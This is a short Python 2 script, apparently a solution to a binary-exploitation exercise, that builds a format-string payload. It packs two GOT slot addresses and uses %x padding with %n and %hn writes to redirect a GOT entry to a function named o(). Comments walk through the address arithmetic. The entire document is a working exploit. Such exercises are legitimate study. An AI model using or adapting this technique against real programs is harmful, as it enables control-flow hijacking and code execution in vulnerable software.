import struct
thi = struct.pack('I', 0x804983a)
# This is the address of the slot in the GOT that we want to modify
tlow = struct.pack('I', 0x8049838)
# The address of o() is 0x80484a4
# => 0x804 + 0x84a4 => 2052 + (33956 - 2052) => 2052 + 31904
print thi + tlow + '%2044x' + '%4$n' + '%31904x' + '%5$hn'
